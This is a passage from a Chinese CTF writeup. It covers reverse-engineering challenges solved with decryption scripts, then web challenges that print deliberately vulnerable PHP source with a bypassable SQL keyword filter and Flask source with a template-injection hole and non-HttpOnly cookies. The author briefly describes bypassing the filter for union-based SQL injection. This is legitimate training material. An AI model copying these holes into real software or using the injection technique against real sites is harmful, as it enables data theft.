---
title: Spark CTF 2026 Writeup (2/5)
description: 这是比赛的 Week 2 部分。
published: 2026-11-11
category: CTF
tags: [Spark CTF 2026, 花指令, 魔改 UPX, PyInstaller, SQL 注入, XSS, SSTI, LFI, PHP 协议滥用, 文件上传, 格式化字符串, ret2system, read 重入, 隐写, OSINT, 流量分析, ICS, 攻击 ZIP 压缩包, AI]
pinned: false
draft: false
image: https://img.halfcity.top/2026/11/11/44929c2f59dbfa428a2bc7d24bbdd26c.avif
---

## Reverse

### 不可逆算法

检查一下 main 函数：

![](https://img.halfcity.top/2026/11/11/99626add72a8ac476c9d43bc616e7dae.avif)

![](https://img.halfcity.top/2026/11/11/c1f8819e075fb569fc6cf1678e32dc29.avif)

`sub_140001F00()` 这个函数给出的伪代码是 `return 0` 很奇怪。

直接看汇编可以发现这个似乎是一个巨大的控制流执行函数，其中控制 selector 似乎是 rcx 的低位字节。

第一眼想到的肯定是控制流平坦化，但是细想会发现不对，因为 OLLVM 出来的控制流不会拆地这么规律。

这里可以划分出 256 条控制流，这里太复杂了，我们先看看后面对 flag 密文处理的逻辑是什么。

![](https://img.halfcity.top/2026/11/11/d2cbd0896f9ea18b1376f3e7b9d46d1d.avif)

![](https://img.halfcity.top/2026/11/11/d3fe07a408453612ee529b79d2baa49e.avif)

`sub_140001728()` 似乎是一个计算输入 SHA256 值的函数，`findcrypt` 也可以看到 SHA256 的常量表：

![](https://img.halfcity.top/2026/11/11/60e15ab66c31d9c73b031959b447a132.avif)

可以 dump 出来校验的 hash 是 `9339B7C4946044719C7AA4DEA1477900C4F0755E850EDFBDFF75BC52342AF9E0`。

这就让人十分懵逼了，给我干哪来了？就给个 hash 难道要我爆破？

flag 中间部分的长度有 24 个字节，显然爆破是不切实际的，回忆一下前面那个巨大的控制流函数，结合这句话 `CFG receipt rendered above`。

虽然暂时不知道它有什么用，但是这应该是解题的关键了。

![](https://img.halfcity.top/2026/11/11/f3436a055011b5826cfda4129b10ffbe.avif)

这里 IDA 限制了 graph 的节点数量，不过我们还是想看看 graph 长什么样子：

![](https://img.halfcity.top/2026/11/11/b2a863b623c615e3698678fc6748b4ac.avif)

这里调大最大节点数然后查看 graph ，好像没什么特殊的，拉远看看整体：

![](https://img.halfcity.top/2026/11/11/d5bd07adbe06a630e50fadc41637d55a.avif)

```txt
flag{cfg_reveals_hash_value_1}
```

### 提瓦特委托局·二：前面的区域，以后再来吧

来到 main 函数：

![](https://img.halfcity.top/2026/11/11/ee8b6a4cfb7251a848724847e8281835.avif)

`sub_1400017A1()` 负责获取输入并提取 flag 的中间部分，`sub_140001B46` 应该是加密比对的逻辑。

进去一看发现提示 `JUMPOUT`，无法分析。

出现这种情况一般只有三种情况，第一种是程序 dump 不完整，第二种是加壳了，第三种就是加花了。

我们去检查一下汇编：

![](https://img.halfcity.top/2026/11/11/9b3aa2493aa67a410005da99f5073eee.avif)

很显然这里是加花了。

`jx jnx` 这种类型是典型的花指令，跳转到指令中间来破坏 IDA 递归下降的分析算法。

这里直接 nop 掉即可，它除了混淆毫无意义。

![](https://img.halfcity.top/2026/11/11/56fda573a1bc8c526c92e3b49a0eef3a.avif)

直接看伪代码发现还有加花的部分，我们继续往下看：

![](https://img.halfcity.top/2026/11/11/7e8cef7e4a22d14761081c8c471c7e0a.avif)

`xor eax, eax` 这条指令值得注意，很多的花指令就是以这条指令开头的，同时我们也注意到从此开始，下面出现了无法分析的部分。

分析一下就可以发现这里的指令毫无意义，异或然后 jp 就相当于 jmp。

`loc_140001BAE` 就是程序接下来的逻辑，但是 IDA 并没有看出来。

那话不多说，直接 nop 掉：

![](https://img.halfcity.top/2026/11/11/6b4a5294e5cacf09580cce153eec1138.avif)

得到程序的伪代码：

![](https://img.halfcity.top/2026/11/11/2a9ce8f84834f86eb925ebd584a0c937.avif)

但是这里发现 `sub_140001892`  还有地方加花了，还是 `jx jnx` 的类型：

![](https://img.halfcity.top/2026/11/11/347228b91d18c0a98fe28b1571ecf14b.avif)

故技重施：

![](https://img.halfcity.top/2026/11/11/650a211771b4c28539e6eaa6ebada6ea.avif)

```c
void __fastcall sub_140001892(_BYTE *a1)
{
  int i; // [rsp+Ch] [rbp-4h]

  for ( i = 0; i <= 7; ++i )
  {
    a1[2 * i] = byte_140014060[i] ^ 0x36;
    a1[2 * i + 1] = byte_140014068[i] ^ 0x36;
  }
}
```

改一下类型，这里可以看到真实的逻辑就很简单了，一个双密钥异或处理产生初始密钥。

随后传入 `sub_14000191B`，进行 RC4 加密。

将数据 dump 出来然后解密即可：

```py
byte_140014060 = bytes([0x70, 0x34, 0x69, 0x6D, 0x30, 0x6E, 0x21, 0x21])
byte_140014068 = bytes([0x72, 0x30, 0x61, 0x64, 0x62, 0x6C, 0x30, 0x6B])

perm = [
    0x05, 0x0C, 0x13, 0x02, 0x09, 0x10, 0x17, 0x06,
    0x0D, 0x14, 0x03, 0x0A, 0x11, 0x00, 0x07, 0x0E,
    0x15, 0x04, 0x0B, 0x12, 0x01, 0x08, 0x0F, 0x16
]

Buf2_ = bytes([
    0xE4, 0x59, 0xF5, 0x39, 0x61, 0xD6, 0x5C, 0xCB,
    0xD4, 0x95, 0xFA, 0xAB, 0x23, 0xB5, 0x3E, 0x31,
    0x7D, 0x18, 0x66, 0xA7, 0xDE, 0xB8, 0x26, 0xD6
])

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    # KSA
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # PRGA
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        result.append(byte ^ k)
    return bytes(result)

def make_key() -> bytes:
    key = bytearray(16)
    for i in range(8):
        key[2 * i]     = byte_140014060[i] ^ 0x36
        key[2 * i + 1] = byte_140014068[i] ^ 0x36
    return bytes(key)

def decrypt():
    key = make_key()
    print(f"[*] RC4 Key (hex) : {key.hex()}")
    print(f"[*] RC4 Key (ascii): {key}")

    intermediate = rc4(Buf2_, key)
    print(f"[*] Intermediate (after RC4 decrypt): {intermediate.hex()}")
    print(f"[*] Intermediate (ascii)            : {intermediate}")

    original = bytearray(24)
    for i in range(24):
        original[perm[i]] = intermediate[i]

    print(f"\n[+] 原始输入 (hex)  : {original.hex()}")
    print(f"[+] 原始输入 (ascii): {original.decode('latin1')}")
    print(f"[+] 原始输入 (bytes): {bytes(original)}")

if __name__ == "__main__":
    decrypt()
```

输出如下：

```txt
[*] RC4 Key (hex) : 464402065f575b520654585a1706175d
[*] RC4 Key (ascii): b'FD\x02\x06_W[R\x06TXZ\x17\x06\x17]'
[*] Intermediate (after RC4 decrypt): 6c6461347965215f5f6c766f5f7462746c336e7772656821
[*] Intermediate (ascii)            : b'lda4ye!__lvo_tbtl3nwreh!'

[+] 原始输入 (hex)  : 74723476336c5f6265796f6e645f7468655f77616c6c2121
[+] 原始输入 (ascii): tr4v3l_beyond_the_wall!!
[+] 原始输入 (bytes): b'tr4v3l_beyond_the_wall!!'
```

```
flag{tr4v3l_beyond_the_wall!!}
```

### 阿萨拉下班指南·二：被篡改的标签

检查一下程序发现加壳了，并且无法直接使用 upx 脱壳。

![](https://img.halfcity.top/2026/11/11/ceba68fdab40fdd3689befccdb471dfe.avif)

观察发现程序的段名被魔改了，这将导致 upx 无法识别程序并脱壳。

还是一样我们先尝试简单修复一下，如果还是不行就直接手脱，因为 upx 自动脱壳的出来的程序效果还是比手脱好一点点的。

![](https://img.halfcity.top/2026/11/11/005944291f4e0c7cca7384c4afe955d9.avif)

尝试脱壳：

```bat
> upx -d D:\data\workspace\download\asara_escape_2.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2023
UPX 4.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Aug 8th 2023

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     32768 <-      9216   28.13%    win64/pe     asara_escape_2.exe

Unpacked 1 file.
```

很好直接成功了，那么我们可以直接进入下一个环节了。

想想逻辑，这个系列的下一个程序应该就是手脱 UPX？

![](https://img.halfcity.top/2026/11/11/4f0767a07666be5e322d821f7b80939a.avif)

观察到这里也是 MSVC 编译的，依旧是熟悉的 mainCRTStartup()，快速定位到 main() 并整理一下：

![](https://img.halfcity.top/2026/11/11/7d5dcd0675728193c8ce5290b5cf6f79.avif)

加密的逻辑都在 sub_14000167B() 里面了，简单修复一下发现是 tea 加密加上字节互换：

![](https://img.halfcity.top/2026/11/11/1665f52c56ceb4c2aacd3ed7a77e64b7.avif)

解密脚本如下：

```py
import struct

def tea_decrypt(v0, v1, key):
    sum_ = 0xC6EF3720
    delta = 0x9E3779B9
    for _ in range(32):
        v1 = (v1 - (((key[3] + (v0 >> 5)) ^ (key[2] + (v0 << 4)) ^ (sum_ + v0)))) & 0xFFFFFFFF
        v0 = (v0 - (((sum_ + v1) ^ (key[1] + (v1 >> 5)) ^ (key[0] + (v1 << 4))))) & 0xFFFFFFFF
        sum_ = (sum_ - delta) & 0xFFFFFFFF
    return v0, v1

key = [0x02468ACE, 0x064A8EC2, 0x389EF3ED, 0xBAA9BE8A]

cipher = bytes([
    0x65, 0x7A, 0x95, 0x7F, 0x8D, 0xD2, 0x80, 0x40,
    0x0F, 0x85, 0x7F, 0x85, 0x78, 0x5C, 0x11, 0x82,
    0x05, 0xA6, 0x6B, 0x79, 0xB1, 0xC7, 0xBA, 0x9A
])

plain = bytearray()
for i in range(0, 24, 8):
    v0, v1 = struct.unpack('<II', cipher[i:i+8])
    d0, d1 = tea_decrypt(v0, v1, key)
    plain += struct.pack('<II', d0, d1)

swapped = bytearray(24)
for i in range(0, 24, 2):
    swapped[i]   = plain[i+1]
    swapped[i+1] = plain[i]

print("decrypted:", swapped.decode())
print("flag:     ", f"flag{{{swapped.decode()}}}")
```

输出如下：

```txt
decrypted: asara_tea_little_endian0
flag:      flag{asara_tea_little_endian0}
```

```txt
flag{asara_tea_little_endian0}
```

### 曼波维修部·二：你还没上班，它已经下班了

主逻辑似乎很简单，这里是加密函数：

![](https://img.halfcity.top/2026/11/11/c1595dc79ffe836ba30598394b865100.avif)

但这里调用了没有初始化的 `byte_4018` 和 `n57`，可能他们在 main 之前就被初始化了。

![](https://img.halfcity.top/2026/11/11/83d33c72a5dfb3081bc296de92f816d4.avif)

可以去 `.init_array` 和 `.finl_array` 看看。

![](https://img.halfcity.top/2026/11/11/14f439548fecaf30c9c4cdf30d9c20e5.avif)

![](https://img.halfcity.top/2026/11/11/79b431772d1a80467ae5f2a563be2ca6.avif)

注意到 `sub_1345()` 这个函数似乎使用 ptrace 来初始化了这两个参数。

得到密钥解密就很简单了。

解密脚本如下：

```py
key = bytes([0x23, 0x51, 0x19, 0xa7, 0x6d, 0x04, 0xc2, 0x88])

s2_ = bytes([
    0xCB, 0x81, 0x77, 0x7B, 0x0C, 0x6B, 0x31, 0x61,
    0xEE, 0x09, 0x2C, 0x6F, 0x8B, 0x08, 0x7D, 0xA2,
    0x87, 0xBD, 0x69, 0x91, 0xEE, 0x98, 0xDB, 0x24
])

def ror3(x: int) -> int:
    return ((x >> 3) | (x << 5)) & 0xff

def decrypt(target: bytes) -> bytes:
    v3 = 57
    result = bytearray(24)
    for i in range(24):
        v4 = ror3(target[i])
        temp = (v4 - v3) & 0xff
        result[i] = key[i % 8] ^ temp
        v3 = target[i]
    return bytes(result)

pt = decrypt(s2_)
print(pt)
print(pt.decode())
```

输出如下：

```txt
> python decrypt.py
b'c4t_keys_before_main!!!!'
c4t_keys_before_main!!!!
```

```txt
flag{c4t_keys_before_main!!!!}
```

### 只是一只小蛇

观察程序图标看得出来这是 pyinstaller 打包的程序。

这里不废话直接解包：

```txt
> pyinstxtractor-ng challenge.exe
[+] Processing challenge.exe
[+] Pyinstaller version: 2.1+
[+] Python version: 3.12
[+] Length of package: 5105361 bytes
[+] Found 54 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: challenge.pyc
[+] Found 92 files in PYZ archive
[+] Successfully extracted pyinstaller archive: challenge.exe

You can now use a python decompiler on the pyc files within the extracted directory
```

`challenge.pyc` 是程序的入口，来到[这里](https://pylingual.io/)反编译 pyc 文件，很好用。

![](https://img.halfcity.top/2026/11/11/08585751da32c414153ccf9a100af493.avif)

得到题目：

```py
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'challenge.py'
# Bytecode version: 3.12.0rc2 (3531)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import base64
CUSTOM = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz9876543210+/'
TARGET = 'c6dsfE1hUxXMBm0oGLNmDJFCJn1sPjdv'
KEY = b'm4nb0key'
INITIAL = 109
def chain(data):
    out = bytearray()
    prev = INITIAL
    for i, value in enumerate(data):
        value ^= KEY[i % len(KEY)] ^ prev
        out.append(value)
        prev = value
    return bytes(out)
def encode(data):
    normal = base64.b64encode(data).decode()
    return normal.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', CUSTOM))
def check(text):
    return len(text) == 30 and text.startswith('flag{') and text.endswith('}') and (encode(chain(text[5:(-1)].encode())) == TARGET)
def main():
    text = input('Shift handoff passphrase: ').strip()
    print('Handoff accepted. Source incident filed separately.' if check(text) else 'It still runs, so the cat says nothing is missing.')
if __name__ == '__main__':
    main()
```

先使用链式异或加密随后使用换表 Base64 编码。

解密脚本如下：

```py
import base64

CUSTOM = 'QWERTYUIOPASDFGHJKLZXCVBNMabcdefghijklmnopqrstuvwxyz9876543210+/'
TARGET = 'c6dsfE1hUxXMBm0oGLNmDJFCJn1sPjdv'
KEY = b'm4nb0key'
INITIAL = 109

# Base64 映射
std = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
normal_b64 = TARGET.translate(str.maketrans(CUSTOM, std))
print("standard b64:", normal_b64)

chained = base64.b64decode(normal_b64)
print("chained bytes:", chained.hex(), chained)

# 反向链式 XOR
prev = INITIAL
plain = bytearray()
for i, value in enumerate(chained):
    orig = value ^ KEY[i % len(KEY)] ^ prev
    plain.append(orig)
    prev = value

print("inner:", plain.decode())
print("flag: ", f"flag{{{plain.decode()}}}")
```

输出如下：

```txt
> python decrypt.py
standard b64: c3dsfC8hGxUZXm9oOSYmMQNVQn8sJjdv
chained bytes: 73776c7c2f211b15195e6f68392626310355427f2c26376f b'swl|/!\x1b\x15\x19^oh9&&1\x03UB\x7f,&7o'
inner: s0urce_was_eaten_by_cat!
flag:  flag{s0urce_was_eaten_by_cat!}
```

```txt
flag{s0urce_was_eaten_by_cat!}
```

### 银河售后中心·二：黑塔女士，别转了

题目给了一个 apk 文件，我们使用 JEB 加载一下：

```java
package org.galactic.aftercare.herta;

import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public final class MainActivity extends AppCompatActivity {
    private boolean accepted;
    private TextView statusText;
    private boolean submitted;
    private EditText tokenInput;

    // 检测为 Lambda 实现
    private void lambda$onCreate$0(View view0) [...]

    // 检测为 Lambda 实现
    private boolean lambda$onCreate$1(TextView textView0, int v, KeyEvent keyEvent0) [...]

    @Override  // androidx.fragment.app.FragmentActivity
    protected void onCreate(Bundle bundle0) {
        super.onCreate(bundle0);
        this.setContentView(layout.activity_main);
        this.tokenInput = (EditText)this.findViewById(id.token_input);
        this.statusText = (TextView)this.findViewById(id.status_text);
        ((Button)this.findViewById(id.open_button)).setOnClickListener((View view0) -> this.submitToken());
        this.tokenInput.setOnEditorActionListener((TextView textView0, int v, KeyEvent keyEvent0) -> {
            if(v != 6) {
                return false;
            }

            this.submitToken();
            return true;
        });
        if(bundle0 != null) {
            this.submitted = bundle0.getBoolean("submitted", false);
            this.accepted = bundle0.getBoolean("accepted", false);
            if(this.submitted) {
                this.showResult();
            }
        }
    }

    @Override  // androidx.activity.ComponentActivity
    protected void onSaveInstanceState(Bundle bundle0) {
        bundle0.putBoolean("submitted", this.submitted);
        bundle0.putBoolean("accepted", this.accepted);
        super.onSaveInstanceState(bundle0);
    }

    private void showResult() {
        this.statusText.setText((this.accepted ? string.accepted : string.rejected));
        this.statusText.setTextColor(this.getColor((this.accepted ? color.success : color.error)));
    }

    private void submitToken() {
        this.accepted = TicketVerifier.check(this.tokenInput.getText().toString());
        this.submitted = true;
        this.showResult();
    }
}
```

这里调用了一个工具类 `TicketVerifier`。

我们进去看下：

```java
package org.galactic.aftercare.herta;

import java.nio.charset.StandardCharsets;

public final class TicketVerifier {
    private static final int[] ORDER;

    static {
        TicketVerifier.ORDER = new int[]{7, 12, 17, 22, 3, 8, 13, 18, 23, 4, 9, 14, 19, 0, 5, 10, 15, 20, 1, 6, 11, 16, 21, 2};
    }

    public static boolean check(String s) {
        if(s != null && s.length() == 30 && s.startsWith("flag{") && s.endsWith("}")) {
            String s1 = s.substring(5, 29);
            int v1 = 0;
            while(v1 < 24) {
                int v2 = s1.charAt(v1);
                if(v2 >= 33 && v2 <= 0x7E) {
                    ++v1;
                    continue;
                }

                return false;
            }

            byte[] arr_b = s1.getBytes(StandardCharsets.US_ASCII);
            byte[] arr_b1 = new byte[24];
            for(int v = 0; v < 24; ++v) {
                arr_b1[v] = arr_b[TicketVerifier.ORDER[v]];
            }

            return NativeDesk.verifyTicket(arr_b1);
        }

        return false;
    }
}
```

这里加载了一个 NativeDesk 的 native 库 并调用了里面的 verifyTicket 方法。

我们将 `libmaintenance.so` 导出分析一下，这里最好导出 ARM 架构的 so，因为 IDA 似乎没有内置对 x64 架构 so 类型的定义。

打开 IDA 发现 `JNIEnv* env` 似乎没有被正确解析，我们手动修复一下一些变量的类型和名称：

![](https://img.halfcity.top/2026/11/11/0f1bfc9b7720ae7f5bdd18296b4067d6.avif)

```c
unsigned __int8 __fastcall sub_7FC(unsigned __int8 a1, char n2)
{
  return ((int)a1 >> n2) | (a1 << (8 - n2));
}
```

但这里在解密的时候遇到了问题，参考程序加密的逻辑：

```txt
ROL8(((v8[i]^key[i&7]) + 3*i) & 0xFF, 2) == T[i]
```

最后确实可以得到一个正确的解，可以这个解有很多非明文字节，实际上是无法通过 Java 层校验并传入 native 层的。

这里几乎遇到了死胡同，因为反复检查程序都没再看到任何可疑的地方了，两边的逻辑都很清晰。

所以这里要大胆假设一下，首先满足 Java 层的逻辑是首要的，所以 native 层的校验逻辑可能有问题？

我们可以尝试一下给几个参数的位置改一下，穷举可能用的公式变体，最后发现确实如此：

```txt
(ROL8(v8[i]^key[i&7], 2) + 3*i) & 0xFF == T[i]
```

这才是真实的生成器的公式。

解密脚本如下：

```py
key = b"H3rTaKey"
target = bytes.fromhex("0E990CD75197D4DAE7AF252926EFB8AFF94E8602CB440407")

rol8 = lambda x, n: ((x << n) | (x >> (8 - n))) & 0xFF

b = bytes(rol8((target[i] - 3 * i) & 0xFF, 2) ^ key[i & 7] for i in range(24))
print(f"b: {b}")

ORDER = [7,12,17,22,3,8,13,18,23,4,9,14,19,0,5,10,15,20,1,6,11,16,21,2]
inner = bytearray(24)
for v in range(24):
    inner[ORDER[v]] = b[v]

print("flag{" + inner.decode() + "}")
```

输出如下：

```txt
> python version_2.py
b: b'pijotinnwantih_so_3s__nr'
flag{h3rta_spins_into_jni_now}
```

```txt
flag{h3rta_spins_into_jni_now}
```

## Web

### FLAG 怪盗团·二

题目给了源码：

```php
<?php

declare(strict_types=1);

$dsn = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', getenv('DB_HOST') ?: 'db', getenv('DB_NAME') ?: 'chichibu_shop');
$pdo = new PDO($dsn, getenv('DB_USER') ?: 'ctf', getenv('DB_PASSWORD') ?: 'ctf_password');
$keyword = $_GET['q'] ?? '';

foreach (['select', 'union', 'from', 'or', 'and', '--'] as $blocked) {
    $keyword = str_ireplace($blocked, '', $keyword);
}

$sql = "SELECT name, description, price, image FROM products WHERE name LIKE '%{$keyword}%'";
$products = [];
$error = '';
try {
    $products = $pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $exception) {
    $error = '检索失败，请调整关键词。';
}
?>
<!doctype html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>DrinkDrankDrunk 酒铺</title>
  <style>
    :root {
      font-family: "Helvetica Neue", Arial, sans-serif;
      color: #111;
      background: #fdfdfd;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
    }

    header {
      padding: 22px 4vw;
      border-bottom: 2px solid #111;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 20px;
      background: #fff;
    }

    header a {
      color: #111;
      text-decoration: none;
      font-weight: 800;
      letter-spacing: .12em;
      transition: opacity 0.2s;
    }

    header a:hover {
      opacity: 0.7;
    }

    .bag {
      border: 2px solid #111;
      padding: 8px 16px;
      font-size: 13px;
      font-weight: bold;
      background: #fff;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .bag:hover {
      background: #111;
      color: #fff;
    }

    main {
      width: min(1180px, calc(100% - 32px));
      margin: 0 auto;
      padding: 54px 0 80px;
    }

    .eyebrow {
      font-size: 11px;
      font-weight: 700;
      letter-spacing: .2em;
      color: #555;
    }

    h1 {
      font-size: clamp(36px, 7vw, 72px);
      line-height: 1;
      margin: 20px 0;
      letter-spacing: -.05em;
      font-weight: 800;
    }

    .intro {
      max-width: 520px;
      line-height: 1.6;
      font-size: 18px;
      color: #333;
    }

    .age-warning {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin-top: 12px;
      padding: 8px 14px;
      background: #fdf2f2;
      border: 1.5px solid #e02424;
      border-radius: 4px;
      color: #9b1c1c;
      font-size: 13px;
      font-weight: bold;
      letter-spacing: 0.02em;
    }

    .rule {
      width: 100%;
      height: 2px;
      background: #111;
      margin: 40px 0 30px;
    }

    form {
      display: flex;
      gap: 0;
      margin: 0 0 40px;
      box-shadow: 4px 4px 0px rgba(0,0,0,1);
      transition: transform 0.1s;
    }

    form:focus-within {
      transform: translate(2px, 2px);
      box-shadow: 2px 2px 0px rgba(0,0,0,1);
    }

    input {
      flex: 1;
      min-width: 0;
      padding: 16px 20px;
      border: 2px solid #111;
      color: #111;
      background: #fff;
      font: inherit;
      font-size: 16px;
      outline: none;
    }

    button {
      padding: 0 32px;
      border: 2px solid #111;
      border-left: 0;
      color: #fff;
      background: #111;
      font: inherit;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s;
    }

    button:hover {
      background: #333;
    }

    .notice {
      padding: 16px;
      border: 2px solid #e74c3c;
      background: #fdeaea;
      color: #c0392b;
      font-weight: bold;
      margin-bottom: 24px;
    }

    .products {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      border-top: 2px solid #111;
      border-left: 2px solid #111;
    }

    article {
      display: flex;
      flex-direction: column;
      border-right: 2px solid #111;
      border-bottom: 2px solid #111;
      background: #fff;
      transition: background-color 0.3s ease;
    }

    article:hover {
      background: #fafafa;
    }

    .photo {
      height: 500px;
      display: grid;
      place-items: center;
      padding: 24px;
      background: #f4f4f4;
      border-bottom: 2px solid #111;
      overflow: hidden;
    }

    .photo img {
      display: block;
      width: 100%;
      height: 100%;
      object-fit: contain;
      transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
    }

    article:hover .photo img {
      transform: scale(1.08);
    }

    .details {
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      padding: 24px;
    }

    h2 {
      margin: 0 0 12px;
      font-size: 18px;
      line-height: 1.3;
      font-weight: 800;
    }

    .details p {
      margin: 0;
      font-size: 14px;
      line-height: 1.6;
      color: #555;
      margin-bottom: 24px;
    }

    .price {
      display: inline-block;
      margin-top: auto;
      font-size: 18px;
      font-weight: 800;
      letter-spacing: .05em;
      color: #111;
    }

    .empty {
      padding: 40px 20px;
      border: 2px solid #111;
      text-align: center;
      font-weight: bold;
      font-size: 18px;
      background: #f9f9f9;
    }

    footer {
      margin-top: 60px;
      padding-top: 24px;
      border-top: 1px solid #e5e5e5;
      font-size: 12px;
      color: #777;
      line-height: 1.8;
      text-align: center;
    }

    @media (max-width: 900px) {
      .products {
        grid-template-columns: repeat(2, 1fr);
      }
    }

    @media (max-width: 600px) {
      .products {
        grid-template-columns: 1fr;
      }
      .photo {
        height: 460px;
      }
      header {
        padding-inline: 16px;
      }
    }
  </style>
</head>

<body>
  <header>
    <a href="shop.php">CHICHIBU<br>LIQUOR STORE</a>
    <span class="bag">BAG (0)</span>
  </header>
  <main>
    <div class="eyebrow">EST. 2026 / CHICHIBU, SAITAMA</div>
    <h1>DrinkDrankDrunk 酒铺</h1>
    <p class="intro">今日精选来自秩父与日本各地的 12 种风味，<a href="https://bgm.tv/blog/364092">商品信息来源</a></p>
    <div class="age-warning">
      <span>法律声明：未成年严禁饮酒！适量饮酒，切勿酒后驾车。</span>
    </div>
    <div class="rule"></div>
    <form method="get">
      <input name="q" value="<?= htmlspecialchars($_GET['q'] ?? '', ENT_QUOTES, 'UTF-8') ?>" placeholder="搜索酒款...">
      <button>搜索</button>
    </form>
    
    <?php if ($error): ?>
      <p class="notice"><?= $error ?></p>
    <?php endif; ?>
    
    <?php if (!$products): ?>
      <p class="empty">没有找到符合条件的酒款。</p>
    <?php else: ?>
      <section class="products">
        <?php foreach ($products as $product): ?>
        <article>
          <div class="photo">
            <?php if ($product['image']): ?>
              <img src="<?= htmlspecialchars($product['image'], ENT_QUOTES, 'UTF-8') ?>" alt="<?= htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8') ?>">
            <?php endif; ?>
          </div>
          <div class="details">
            <h2><?= htmlspecialchars($product['name'], ENT_QUOTES, 'UTF-8') ?></h2>
            <p><?= htmlspecialchars($product['description'], ENT_QUOTES, 'UTF-8') ?></p>
            <strong class="price"><?= htmlspecialchars($product['price'], ENT_QUOTES, 'UTF-8') ?></strong>
          </div>
        </article>
        <?php endforeach; ?>
      </section>
    <?php endif; ?>

    <footer>
      <p>※ 本站为 CTF 教学练习靶场，不提供任何真实酒类在线销售服务。</p>
      <p>健康饮酒提示：未成年人不得饮酒，孕妇及哺乳期妇女请勿饮酒，过量饮酒有害健康。</p>
    </footer>
  </main>
</body>

</html>
```

这里可以注意到虽然有字符的替换，但是还是可以绕过并进行 SQL 注入。

来到主页测试一下 SQL 注入：

![](https://img.halfcity.top/2026/11/11/763c791dc84e48c85f1e15d810d773a9.avif)

![](https://img.halfcity.top/2026/11/11/a053a727db1b34d14cd12f3a8ada67bf.avif)

响应不同，算是测试通过了。

这里尝试使用联合注入获取基础的信息，注意这里需要部分双击绕过字符替换检查：

![](https://img.halfcity.top/2026/11/11/bdc31352fbe0b2bf913a16083ae15ef1.avif)

发现联合注入可用，这就很好了。

尝试检查所有的表：

![](https://img.halfcity.top/2026/11/11/76ee64259b7f70d09fc14f46c66b6563.avif)

尝试读取 flag 表的字段：

![](https://img.halfcity.top/2026/11/11/1cea244c4818fa77280ba6456b60bc21.avif)

尝试读取 flag 字段的值：

![](https://img.halfcity.top/2026/11/11/b984fb7334f1bca36e0ef1e4f2dd006c.avif)

```txt
flag{l_I0VE_yUr1-m0Re-thAn_sQIl16f117ad}
```

### 小雷的 vibe coding 之旅 (2)

得到的附件中可以看到服务端的源码：

```py
import os
import re
import secrets
from datetime import datetime, timezone

import jwt
from flask import (Flask, redirect, render_template, render_template_string,
                   request, url_for)

app = Flask(__name__)

ADMIN_PASS = os.environ.get("ADMIN_PASS", secrets.token_hex(16))
USERS = {"admin": ADMIN_PASS}

JWT_SECRET = os.environ.get("JWT_SECRET", secrets.token_hex(32))
VISITORS = {}

messages = []
announcement = "欢迎来到小雷的博客，留言板已开放！"


def make_token(username, role):
    payload = {
        "username": username,
        "role": role,
        "iat": datetime.now(timezone.utc),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")


def current_identity():
    token = request.cookies.get("token")
    if not token:
        return None
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
    except Exception:
        return None


def is_admin():
    data = current_identity()
    return bool(
        data
        and data.get("username") == "admin"
        and data.get("role") == "admin"
    )


def current_visitor():
    data = current_identity()
    if not data:
        return None
    if data.get("role") != "visitor":
        return None
    return data.get("username")


def render_announcement():
    return render_template_string(announcement)


@app.route("/")
def index():
    return render_template("index.html", announcement=render_announcement())


@app.route("/register", methods=["GET", "POST"])
def register():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()[:20]
        password = request.form.get("password", "")
        if not username or not password:
            error = "用户名和密码不能为空"
        elif username in VISITORS or username in USERS:
            error = "用户名已被占用"
        else:
            VISITORS[username] = password
            return redirect(url_for("login", registered=1))
    return render_template("register.html", error=error)


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        if USERS.get(username) == password:
            token = make_token(username, "admin")
            resp = redirect(url_for("admin"))
            resp.set_cookie("token", token, httponly=False)
            return resp
        if VISITORS.get(username) == password:
            token = make_token(username, "visitor")
            resp = redirect(url_for("guestbook"))
            resp.set_cookie("token", token, httponly=False)
            return resp
        error = "用户名或密码错误！"
    if request.args.get("registered"):
        notice = "注册成功，请登录"
    else:
        notice = None
    return render_template("login.html", error=error, notice=notice)


@app.route("/guestbook", methods=["GET", "POST"])
def guestbook():
    if request.method == "POST":
        if is_admin():
            poster = "admin"
        else:
            poster = current_visitor()
        if not poster:
            return redirect(url_for("login"))
